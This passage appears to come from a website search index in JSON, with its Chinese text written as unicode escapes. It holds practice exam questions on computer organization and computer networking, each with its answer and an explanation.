\u89e3\u6790\uff1a\u7a0b\u5e8f\u8ba1\u6570\u5668\u662f\u7528\u4e8e\u5b58\u653e\u4e0b\u4e00\u6761\u6307\u4ee4\u6240\u5728\u5355\u5143\u7684\u5730\u5740\u7684\u5730\u65b9\u3002\u5f53\u6267\u884c\u4e00\u6761\u6307\u4ee4\u65f6\uff0c\u9996\u5148\u9700\u8981\u6839\u636ePC\u4e2d\u5b58\u653e\u7684\u6307\u4ee4\u5730\u5740\uff0c\u5c06\u6307\u4ee4\u7531\u5185\u5b58\u53d6\u5230\u6307\u4ee4\u5bc4\u5b58\u5668\u4e2d\uff0c\u6b64\u8fc7\u7a0b\u79f0\u4e3a\u201c\u53d6\u6307\u4ee4\u201d\u3002\u4e0e\u6b64\u540c\u65f6\uff0cPC\u4e2d\u7684\u5730\u5740\u6216\u81ea\u52a8\u52a01\u6216\u7531\u8f6c\u79fb\u6307\u9488\u7ed9\u51fa\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u3002 2. Week 4 # 2.1. Wed # \u4e0b\u5217\u5b58\u50a8\u5668\u5c5e\u4e8e\u6325\u53d1\u6027\u7684\u662f \u3002[\u56fd\u9632\u79d1\u6280\u5927\u5b66821] A.SRAM B.PROM C.EPROM D.EEPROM \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u6325\u53d1\u6027\u548c\u975e\u6325\u53d1\u6027\u5b58\u50a8\u5668\u8ddf\u6389\u7535\u4e22\u5931\u4e0e\u5426\u6709\u5173\u3002\u524d\u8005\u4e3a\u6389\u7535\u6570\u636e\u4e22\u5931\u3002RAM\u4e3a\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668\uff0c\u7406\u8bba\u4e0a\u65ad\u7535\u540e\u6570\u636e\u5168\u4e22\u5931\uff0c\u4f46\u662f\u975e\u6325\u53d1\u6027RAM\u5185\u7f6e\u4e86\u4e00\u4e2a\u7535\u6e90\uff0c\u6709\u4e2a\u68c0\u6d4b\u7cfb\u7edf\u662f\u5426\u6389\u7535\u7684\u7535\u8def\uff0c\u5f53\u76d1\u6d4b\u5230\u6389\u7535\u65f6\uff0c\u5373\u63a5\u901a\u5185\u90e8\u7535\u6e90\u4ee5\u786e\u4fdd\u65f6\u95f4\u4fdd\u6301\u548c\u5185\u5b58\u6570\u636e\u4e0d\u53d7\u7834\u574f\u3002\u8fd9\u76f8\u5f53\u4e8e\u6ca1\u6709\u6389\u7535\uff0c\u5373RAM\u7684\u6570\u636e\u4e5f\u6ca1\u4e22\u5931\u3002\u9759\u6001\u968f\u673a\u5b58\u50a8\u5668\uff08\u82f1\u6587\uff1aStatic RAM\uff0cSRAM)\u5c5e\u4e8e\u6325\u53d1\u6027\u5b58\u50a8\u5668\u3002 2.2. Sun # \u4e0b\u5217\u4e0d\u4f1a\u5f15\u8d77\u6307\u4ee4\u6d41\u6c34\u963b\u585e\u7684\u662f [\u56fd\u9632\u79d1\u6280\u5927\u5b66821] A\uff0e\u6570\u636e\u65c1\u8def B\uff0e\u6570\u636e\u76f8\u5173 C\uff0e\u6761\u4ef6\u8f6c\u79fb D\uff0e\u8d44\u6e90\u51b2\u7a81 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u6709\u4e09\u79cd\u76f8\u5173\u53ef\u80fd\u5f15\u8d77\u6307\u4ee4\u6d41\u6c34\u7ebf\u963b\u585e\uff1a 1\uff0e\u7ed3\u6784\u76f8\u5173\uff0c\u53c8\u79f0\u8d44\u6e90\u76f8\u5173\uff1b 2\uff0e\u6570\u636e\u76f8\u5173\uff1b 3\uff0e\u63a7\u5236\u76f8\u5173\uff0c\u4e3b\u8981\u7531\u8f6c\u79fb\u6307\u4ee4\u5f15\u8d77\u3002 \u6570\u636e\u65c1\u8def\u6280\u672f\uff0c\u5176\u4e3b\u8981\u601d\u60f3\u662f\u4e0d\u5fc5\u5f85\u67d0\u6761\u6307\u4ee4\u7684\u6267\u884c\u7ed3\u679c\u9001\u56de\u5230\u5bc4\u5b58\u5668\uff0c\u518d\u4ece\u5bc4\u5b58\u5668\u4e2d\u53d6\u51fa\u8be5\u7ed3\u679c\uff0c\u4f5c\u4e3a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u6e90\u64cd\u4f5c\u6570\uff0c\u800c\u662f\u76f4\u63a5\u5c06\u6267\u884c\u7ed3\u679c\u9001\u5230\u5176\u4ed6\u6307\u4ee4\u6240\u9700\u8981\u7684\u5730\u65b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u4f7f\u6d41\u6c34\u7ebf\u4e0d\u53d1\u751f\u505c\u987f\u3002","title":"2020 Sep"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#2020-sep","text":"","title":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 Sep"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#_1","text":"\u8ba1\u7b97\u673a\u7ec4\u6210\u6bcf\u65e5\u4e00\u9898 2020 Sep \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Wed 2. Week 4 2.1. Wed 2.2. Sun","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#1-week-3","text":"","title":"1. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#11-wed","text":"\u4e24\u4e2a\u91c7\u7528\u53d8\u578b\u8865\u7801\u8868\u793a\u7684\u6570\u8fdb\u884c\u52a0\u51cf\u8fd0\u7b97\u65f6\uff0c\u53d1\u751f\u8d1f\u6ea2\u51fa\u7684\u7279\u5f81\u662f\u53cc\u7b26\u53f7\u4f4d\u4e3a [\u56fd\u9632\u79d1\u6280\u5927\u5b66821] A\uff0e01 B\uff0e00 C\uff0e10 D\uff0e11 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u82e5\u8fd0\u7b97\u7ed3\u679c\u7684\u53cc\u7b26\u53f7\u4f4d\u4e3a00\uff0c \u8868\u793a\u7ed3\u679c\u4e3a\u6b63\u6570\uff0c\u65e0\u6ea2\u51fa\uff1b \u82e5\u8fd0\u7b97\u7ed3\u679c\u7684\u53cc\u7b26\u53f7\u4f4d\u4e3a11\uff0c\u8868\u793a\u7ed3\u679c\u4e3a\u8d1f\u6570\uff0c\u65e0\u6ea2\u51fa\uff1b \u82e5\u8fd0\u7b97\u7ed3\u679c\u7684\u53cc\u7b26\u53f7\u4f4d\u4e3a10\uff0c\u8868\u793a\u8d1f\u6ea2\u51fa\u3002 \u5f53\u8fd0\u7b97\u7ed3\u679c\u7684\u53cc\u7b26\u53f7\u4f4d\u4e3a01\uff0c\u8868\u793a\u6b63\u6ea2\u51fa","title":"1.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#12-wed","text":"\u5728\u53d6\u6307\u4ee4\u64cd\u4f5c\u4e4b\u540e\uff0c\u7a0b\u5e8f\u8ba1\u6570\u5668PC\u5b58\u653e\u7684\u662f [\u56fd\u9632\u79d1\u6280\u5927\u5b66821] A\u3001\u5f53\u524d\u6307\u4ee4\u7684\u5730\u5740 B\u3001\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 C\u3001\u4e0a\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740 D\u3001\u7a0b\u5e8f\u4e2d\u6307\u4ee4\u7684\u6570\u91cf \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u7a0b\u5e8f\u8ba1\u6570\u5668\u662f\u7528\u4e8e\u5b58\u653e\u4e0b\u4e00\u6761\u6307\u4ee4\u6240\u5728\u5355\u5143\u7684\u5730\u5740\u7684\u5730\u65b9\u3002\u5f53\u6267\u884c\u4e00\u6761\u6307\u4ee4\u65f6\uff0c\u9996\u5148\u9700\u8981\u6839\u636ePC\u4e2d\u5b58\u653e\u7684\u6307\u4ee4\u5730\u5740\uff0c\u5c06\u6307\u4ee4\u7531\u5185\u5b58\u53d6\u5230\u6307\u4ee4\u5bc4\u5b58\u5668\u4e2d\uff0c\u6b64\u8fc7\u7a0b\u79f0\u4e3a\u201c\u53d6\u6307\u4ee4\u201d\u3002\u4e0e\u6b64\u540c\u65f6\uff0cPC\u4e2d\u7684\u5730\u5740\u6216\u81ea\u52a8\u52a01\u6216\u7531\u8f6c\u79fb\u6307\u9488\u7ed9\u51fa\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u3002","title":"1.2. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#2-week-4","text":"","title":"2. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#21-wed","text":"\u4e0b\u5217\u5b58\u50a8\u5668\u5c5e\u4e8e\u6325\u53d1\u6027\u7684\u662f \u3002[\u56fd\u9632\u79d1\u6280\u5927\u5b66821] A.SRAM B.PROM C.EPROM D.EEPROM \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u6325\u53d1\u6027\u548c\u975e\u6325\u53d1\u6027\u5b58\u50a8\u5668\u8ddf\u6389\u7535\u4e22\u5931\u4e0e\u5426\u6709\u5173\u3002\u524d\u8005\u4e3a\u6389\u7535\u6570\u636e\u4e22\u5931\u3002RAM\u4e3a\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668\uff0c\u7406\u8bba\u4e0a\u65ad\u7535\u540e\u6570\u636e\u5168\u4e22\u5931\uff0c\u4f46\u662f\u975e\u6325\u53d1\u6027RAM\u5185\u7f6e\u4e86\u4e00\u4e2a\u7535\u6e90\uff0c\u6709\u4e2a\u68c0\u6d4b\u7cfb\u7edf\u662f\u5426\u6389\u7535\u7684\u7535\u8def\uff0c\u5f53\u76d1\u6d4b\u5230\u6389\u7535\u65f6\uff0c\u5373\u63a5\u901a\u5185\u90e8\u7535\u6e90\u4ee5\u786e\u4fdd\u65f6\u95f4\u4fdd\u6301\u548c\u5185\u5b58\u6570\u636e\u4e0d\u53d7\u7834\u574f\u3002\u8fd9\u76f8\u5f53\u4e8e\u6ca1\u6709\u6389\u7535\uff0c\u5373RAM\u7684\u6570\u636e\u4e5f\u6ca1\u4e22\u5931\u3002\u9759\u6001\u968f\u673a\u5b58\u50a8\u5668\uff08\u82f1\u6587\uff1aStatic RAM\uff0cSRAM)\u5c5e\u4e8e\u6325\u53d1\u6027\u5b58\u50a8\u5668\u3002","title":"2.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#22-sun","text":"\u4e0b\u5217\u4e0d\u4f1a\u5f15\u8d77\u6307\u4ee4\u6d41\u6c34\u963b\u585e\u7684\u662f [\u56fd\u9632\u79d1\u6280\u5927\u5b66821] A\uff0e\u6570\u636e\u65c1\u8def B\uff0e\u6570\u636e\u76f8\u5173 C\uff0e\u6761\u4ef6\u8f6c\u79fb D\uff0e\u8d44\u6e90\u51b2\u7a81 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u6709\u4e09\u79cd\u76f8\u5173\u53ef\u80fd\u5f15\u8d77\u6307\u4ee4\u6d41\u6c34\u7ebf\u963b\u585e\uff1a 1\uff0e\u7ed3\u6784\u76f8\u5173\uff0c\u53c8\u79f0\u8d44\u6e90\u76f8\u5173\uff1b 2\uff0e\u6570\u636e\u76f8\u5173\uff1b 3\uff0e\u63a7\u5236\u76f8\u5173\uff0c\u4e3b\u8981\u7531\u8f6c\u79fb\u6307\u4ee4\u5f15\u8d77\u3002 \u6570\u636e\u65c1\u8def\u6280\u672f\uff0c\u5176\u4e3b\u8981\u601d\u60f3\u662f\u4e0d\u5fc5\u5f85\u67d0\u6761\u6307\u4ee4\u7684\u6267\u884c\u7ed3\u679c\u9001\u56de\u5230\u5bc4\u5b58\u5668\uff0c\u518d\u4ece\u5bc4\u5b58\u5668\u4e2d\u53d6\u51fa\u8be5\u7ed3\u679c\uff0c\u4f5c\u4e3a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u6e90\u64cd\u4f5c\u6570\uff0c\u800c\u662f\u76f4\u63a5\u5c06\u6267\u884c\u7ed3\u679c\u9001\u5230\u5176\u4ed6\u6307\u4ee4\u6240\u9700\u8981\u7684\u5730\u65b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u4f7f\u6d41\u6c34\u7ebf\u4e0d\u53d1\u751f\u505c\u987f\u3002","title":"2.2. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 August # \u76ee\u5f55 # \u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 August \u76ee\u5f55 1. Week 1 1.1. Mon 1.2. Tue 1.3. Wed 1.4. Thu 1.5. Fri 2. Week 2 2.1. Sat 2.2. Sun 3. Week 3 3.1. Mon 3.2. Tue 3.3. Wed 3.4. Thu 4. Week 4 4.1. Tue 1. Week 1 # 1.1. Mon # \u8bbeTCP\u4f7f\u7528\u7684\u6700\u5927\u7a97\u53e3\u4e3a64KB\uff0c\u800c\u4f20\u8f93\u4fe1\u9053\u7684\u5e26\u5bbd\u53ef\u8ba4\u4e3a\u662f\u4e0d\u53d7\u9650\u5236\u7684\u3002\u82e5\u62a5\u6587\u6bb5\u7684\u5e73\u5747\u5f80\u8fd4\u65f6\u5ef6\u4e3a20ms\uff0c\u95ee\u6240\u80fd\u5f97\u5230\u7684\u6700\u5927\u541e\u5410\u91cf\u662f \u3002[\u4e2d\u5c71\u5927\u5b66] A. 24.6 B. 26.2 C. 25.8 D. 26.8 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u4f20\u8f93\u4fe1\u9053\u7684\u5e26\u5bbd\u53ef\u8ba4\u4e3a\u662f\u4e0d\u53d7\u9650\u5236\u7684\uff0c\u5219\u53d1\u9001\u65f6\u5ef6\u53ef\u5ffd\u7565\u3002\u5e73\u5747\u5f80\u8fd4\u65f6\u5ef6\u4e3a20ms\uff0c\u5219\u53d1\u9001\u65b9\u6bcf\u79d2\u53ef\u53d1\u9001\u6570\u636e=1/(20*10-3)=50\u6b21\u53ea\u6709\u6bcf\u6b21\u90fd\u6309\u6700\u5927\u7a97\u53e3\u6570\u53d1\u9001\u6570\u636e\u624d\u80fd\u5f97\u5230\u6700\u5927\u7684\u541e\u5410\u91cf\u3002\u6240\u4ee5\uff1a\u6700\u5927\u541e\u5410\u91cf=\u6bcf\u79d2\u53d1\u9001\u6570\u636e\u6b21\u6570*\u6700\u5927\u7a97\u53e3=50*64KB=50*64*1024*8=26.2Mbps\u3002 1.2. Tue # \u4e0b\u5217\u9009\u9879\u4e2d\uff0c\u5bf9\u6b63\u786e\u63a5\u6536\u5230\u7684\u6570\u636e\u5e27\u8fdb\u884c\u786e\u8ba4\u7684MAC \u534f\u8bae\u662f \u3002[\u4e2d\u5c71\u5927\u5b66] A. CSMA B. CDMA C. CSMA / CD D. CSMA / CA \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u53ef\u4ee5\u7528\u6392\u9664\u6cd5\u3002\u9996\u5148CDMA\u5373\u7801\u5206\u591a\u5740\uff0c\u662f\u7269\u7406\u5c42\u7684\u4e1c\u897f\uff1bCSMA/CD\u5373\u5e26\u51b2\u7a81\u68c0\u6d4b\u7684\u8f7d\u6ce2\u76d1\u542c\u591a\u8def\u8bbf\u95ee\uff0c\u8fd9\u4e2a\u5e94\u8be5\u6bd4\u8f83\u719f\u6089\uff0c\u63a5\u6536\u65b9\u5e76\u4e0d\u9700\u8981\u786e\u8ba4\uff1bCSMA\uff0c\u65e2\u7136CSMA/CD\u662f\u5176\u8d85\u96c6\uff0cCSMA/CD\u6ca1\u6709\u7684\u4e1c\u897f\uff0cCSMA\u81ea\u7136\u4e5f\u6ca1\u6709\u3002\u4e8e\u662f\u6392\u9664\u6cd5\u9009D\u3002CSMA/CA\u662f\u65e0\u7ebf\u5c40\u57df\u7f51\u6807\u51c6802.11\u4e2d\u7684\u534f\u8bae\u3002CSMA/CA\u5229\u7528ACK\u4fe1\u53f7\u6765\u907f\u514d\u51b2\u7a81\u7684\u53d1\u751f\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u6709\u5f53\u5ba2\u6237\u7aef\u6536\u5230\u7f51\u7edc\u4e0a\u8fd4\u56de\u7684ACK\u4fe1\u53f7\u540e\u624d\u786e\u8ba4\u9001\u51fa\u7684\u6570\u636e\u5df2\u7ecf\u6b63\u786e\u5230\u8fbe\u76ee\u7684\u5730\u5740\u3002 1.3. Wed # \u5728OSI\u53c2\u8003\u6a21\u578b\u4e2d\uff0c\u7b2cN\u5c42\u548c\u5176\u4e0a\u7684\u7b2cN+1\u5c42\u7684\u5173\u7cfb\u662f \u3002[\u56db\u5ddd\u5927\u5b66873-2018] A\uff0e\u7b2cN\u5c42\u4e3a\u7b2cN+1\u5c42\u63d0\u4f9b\u670d\u52a1 B\uff0e\u7b2cN+1\u5c42\u5c06\u4ece\u7b2cN\u5c42\u63a5\u6536\u7684\u4fe1\u606f\u589e\u52a0\u4e86\u4e00\u4e2a\u5934 C\uff0e\u7b2cN\u5c42\u5229\u7528\u7b2cN+1\u5c42\u63d0\u4f9b\u7684\u670d\u52a1 D\uff0e\u7b2cN\u5c42\u5bf9N+1\u5c42\u6ca1\u6709\u4efb\u4f55\u4f5c\u7528 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u672c\u9898\u8003\u67e5OSI\u6a21\u578b\u7684\u5c42\u6b21\u5173\u7cfb\uff0c\u5728\u534f\u8bae\u7684\u63a7\u5236\u4e0b\uff0c\u4e24\u4e2a\u5bf9\u7b49\u5b9e\u4f53\u95f4\u7684\u901a\u4fe1\u4f7f\u5f97\u672c\u5c42\u80fd\u591f\u5411\u4e0a\u4e00\u5c42\u63d0\u4f9b\u670d\u52a1\uff0c\u540c\u65f6\u8981\u5b9e\u73b0\u672c\u5c42\u534f\u8bae\uff0c\u8fd8\u9700\u8981\u4f7f\u7528\u4e0b\u5c42\u6240\u63d0\u4f9b\u7684\u670d\u52a1\u3002\u672c\u5c42\u7684\u670d\u52a1\u7528\u6237\u53ea\u80fd\u770b\u89c1\u670d\u52a1\u800c\u65e0\u6cd5\u770b\u89c1\u4e0b\u9762\u7684\u534f\u8bae\u3002\u4e0b\u5c42\u7684\u534f\u8bae\u5bf9\u4e0a\u5c42\u7684\u670d\u52a1\u7528\u6237\u662f\u900f\u660e\u7684\u3002\u4e5f\u5c31\u662f\u4e0b\u4e00\u5c42\u8981\u4e3a\u4e0a\u4e00\u5c42\u63d0\u4f9b\u670d\u52a1\uff0c\u5e76\u4e3a\u4e0a\u4e00\u5c42\u6570\u636e\u8fdb\u884c\u5c01\u88c5\uff0c\u56e0\u6b64\u7b54\u6848\u4e3aA\uff0c\u8fd9\u91cc\u9009\u9879B\u548cC\u7684\u8bf4\u6cd5\u6b63\u597d\u76f8\u53cd\uff0c\u5e94\u8be5\u662f\u7b2cN\u5c42\u5c06\u4ece\u7b2cN+1\u5c42\u63a5\u6536\u7684\u4fe1\u606f\u589e\u52a0\u4e86\u4e00\u4e2a\u5934\uff0c\u7b2cN+1\u5c42\u5229\u7528\u7b2cN\u5c42\u63d0\u4f9b\u7684\u670d\u52a1\u3002 1.4. Thu # \u4ee5\u4e0b\u5404\u9879\u4e2d\uff0c\u4e0d\u662f\u6570\u636e\u62a5\u64cd\u4f5c\u7279\u70b9\u7684\u662f [\u56db\u5ddd\u5927\u5b66873-2018] A. \u6bcf\u4e2a\u5206\u7ec4\u81ea\u8eab\u643a\u5e26\u6709\u8db3\u591f\u7684\u4fe1\u606f\uff0c\u5b83\u7684\u4f20\u9001\u662f\u88ab\u5355\u72ec\u5904\u7406\u7684 B. \u5728\u6574\u4e2a\u4f20\u9001\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u9700\u5efa\u7acb\u865a\u7535\u8def C. \u4f7f\u6240\u6709\u5206\u7ec4\u6309\u987a\u5e8f\u5230\u8fbe\u76ee\u7684\u7aef\u7cfb\u7edf D. \u7f51\u7edc\u8282\u70b9\u8981\u4e3a\u6bcf\u4e2a\u5206\u7ec4\u505a\u51fa\u8def\u7531\u9009\u62e9 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u6570\u636e\u62a5\u9ed8\u8ba4\u662f\u6307UDP\u6570\u636e\u62a5\uff0c\u800c\u62a5\u6587\u6bb5\u5f80\u5f80\u548cTCP\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u79f0\u4f5cTCP\u62a5\u6587\u6bb5\u3002 UDP\u662f\u4e00\u79cd\u65e0\u8fde\u63a5\u3001\u65e0\u72b6\u6001\u7684\u4f20\u8f93\u5c42\u534f\u8bae\u3002 1.5. Fri # \u5728CSMA/CD\u534f\u8bae\u4e2d\uff0c\u4e0b\u5217\u6307\u6807\u4e0e\u51b2\u7a81\u65f6\u95f4\u6ca1\u6709\u5173\u7cfb\u7684\u662f______\u3002[\u5409\u6797\u5927\u5b66979] A\uff0e\u68c0\u6d4b\u4e00\u6b21\u51b2\u7a81\u6240\u9700\u7684\u6700\u957f\u65f6\u95f4 B\uff0e\u6700\u5c0f\u5e27\u957f\u5ea6 C\uff0e\u6700\u5927\u5e27\u957f\u5ea6 D\uff0e\u6700\u5927\u5e27\u788e\u7247\u957f\u5ea6 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u672c\u9898\u8003\u67e5CSMA/CD\u534f\u8bae\u4e2d\u51b2\u7a81\u65f6\u95f4\u3002\u51b2\u7a81\u65f6\u95f4\u5c31\u662f\u80fd\u591f\u8fdb\u884c\u51b2\u7a81\u68c0\u6d4b\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5176\u51b3\u5b9a\u4e86\u6700\u5c0f\u5e27\u7684\u957f\u5ea6\u548c\u6700\u5927\u5e27\u788e\u7247\u7684\u957f\u5ea6\uff0c\u5bf9\u6700\u5927\u5e27\u7684\u957f\u5ea6\u6ca1\u6709\u5f71\u54cd\uff0c\u56e0\u6b64\u7b54\u6848\u662fC\u3002 2. Week 2 # 2.1. Sat # \u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u5171 3072\u5b57\u8282\u957f\u3002\u82e5\u4f7f\u7528base64\u7f16\u7801\uff0c\u5e76\u4e14\u6bcf\u53d1\u9001\u5b8c80\u5b57\u8282\u5c31\u63d2\u5165\u4e00\u4e2a\u56de\u8f66\u7b26CR\u548c\u4e00\u4e2a\u6362\u884c\u7b26LF,\u95ee\u4e00\u5171\u53d1\u9001\u4e86\u591a\u5c11\u4e2a\u5b57\u8282? [\u91cd\u5e86\u90ae\u7535\u5927\u5b66803-2017] A\uff0e4200 B\uff0e4198 C\uff0e4196 D\uff0e3150 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1abase64\u7684\u7f16\u7801\u539f\u5219\u65b9\u6cd5\u662f\u5148\u5c06\u4e8c\u8fdb\u5236\u4ee3\u7801\u5212\u5206\u4e3a\u4e00\u4e2a24bit\u957f\u7684\u5355\u5143\uff0c\u7136\u540e\u5c06\u6bcf\u4e00\u4e2a24bit\u5355\u5143\u5212\u5206\u4e3a4\u4e2a6bit\u7ec4\uff0c\u6bcf\u4e00\u4e2a6bit\u7ec4\u6309\u7167\u4e00\u4e0b\u65b9\u6cd5\u8f6c\u6362\u6210ASCII\u7801\u30026bit\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\u5171\u670964\u4e2d\u4e0d\u540c\u7684\u503c\uff0c\u4ece0\u523063\uff0c\u5206\u522b\u7528\u5927\u5199\u5b57\u7801\uff0c\u5c0f\u5199\u5b57\u7801\uff0c10\u4e2a\u963f\u62c9\u4f2f\u6570\u5b57\uff0c+\uff0c/\u8868\u793a\uff0c\u518d\u7528\u4e24\u4e2a\u8fde\u5728\u4e00\u8d77\u7684\u7b49\u53f7\u548c\u4e00\u4e2a\u7b49\u53f7\u5206\u522b\u8868\u793a\u6700\u540e\u4e00\u7ec4\u7684\u4ee3\u7801\u53ea\u67098\u621616bit\u3002\u56de\u8f66\u548c\u6362\u884c\u53ef\u4ee5\u5728\u4efb\u4f55\u5730\u65b9\u63d2\u5165\u3002\u7136\u540e\u5c06ASCII\u7801\u8fdb\u884c\u4f20\u8f93\u3002\u7b80\u5355\u8bf4\uff0c\u662f\u5c06\u6bcf6bit\u7684\u6570\u636e\u8f6c\u6362\u4e3a8bit\u4e4b\u540e\u518d\u8fdb\u884c\u4f20\u8f93\u3002 \u8f6c\u6362\u540e\u5171\u9700\u8981\u4f20\u9001\u7684\u5b57\u8282\u6570=3072 / 6*8=4096,\u7531\u9898\u77e5\u6bcf80\u4e2a\u5b57\u8282\u5c31\u63d2\u5165\u4e24\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u4e00\u5171\u8fd8\u9700\u8981\u63d2\u5165\u7684\u5b57\u8282\u6570\u4e3a4096/80*2=102\u518d\u52a0\u4e0a\u6700\u540e\u4e00\u7ec4\u53d1\u9001\u5b8c\u5e94\u7b54\u5982\u7684CR\u548cLF\uff0c\u6700\u540e\u4e00\u5171\u9700\u8981\u4f20\u8f93\u7684\u5b57\u8282\u6570\u4e3a4096+102+2=4200\u3002 2.2. Sun # \u7535\u8bdd\u7cfb\u7edf\u7684\u5178\u578b\u53c2\u6570\u662f\u4fe1\u9053\u5e26\u5bbd\u4e3a3000Hz\uff0c\u4fe1\u566a\u6bd4\u4e3a30dB\uff0c\u5219\u8be5\u7cfb\u7edf\u7684\u6700\u5927\u6570\u636e\u4f20\u8f93\u901f\u7387\u4e3a\u591a\u5c11\uff1f[\u91cd\u5e86\u90ae\u7535\u5927\u5b66803-2017] A\uff0e3kbps B\uff0e6kbps C\uff0e30kbps D\uff0e64kbps \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u7535\u8bdd\u7cfb\u7edf\u7684\u4fe1\u9053\u662f\u6709\u566a\u58f0\u7684\u4fe1\u9053\uff0c\u6240\u4ee5\u8be5\u9898\u5e94\u8be5\u7528\u9999\u519c\u516c\u5f0f\u6765\u6c42\u89e3. \u4fe1\u566a\u6bd4\uff08dB)=10log10(S/N) (dB) 30dB=10log10(S/N) dB \u89e3\u5f97\uff1aS/N=1000 \u6839\u636e\u9999\u519c\u516c\u5f0f\uff1a\u4f20\u8f93\u901f\u7387C=Wlog2(1+S/N) (bit/s) W\u4e3a\u4fe1\u9053\u5e26\u5bbd C=3000*log2\uff081+S/N\uff09bit/s =3000*10 bit/s =30*1000 bit/s =30 kbit/s 3. Week 3 # 3.1. Mon # \u900f\u660e\u7f51\u6865\u4f7f\u7528\u4e86\u4e00\u4e2a\u53eb\u505a\u751f\u6210\u6811\u7684\u7b97\u6cd5\uff0c\u6b64\u7b97\u6cd5\u7684\u6700\u7ec8\u76ee\u7684\u662f\u89e3\u51b3\u900f\u660e\u7f51\u6865\u91cc\u5b58\u5728\u7684\u4ec0\u4e48\u95ee\u9898\uff1f[\u91cd\u5e86\u90ae\u7535\u5927\u5b66803] A\uff0e\u901a\u4fe1\u91cf\u95ee\u9898 B\uff0e\u901a\u4fe1\u8d1f\u8f7d\u95ee\u9898 C\uff0e\u5e7f\u64ad\u98ce\u66b4\u95ee\u9898 D\uff0e\u515c\u5708\u5b50\u95ee\u9898 \u7b54\u6848 \u7b54\u6848\uff1aD 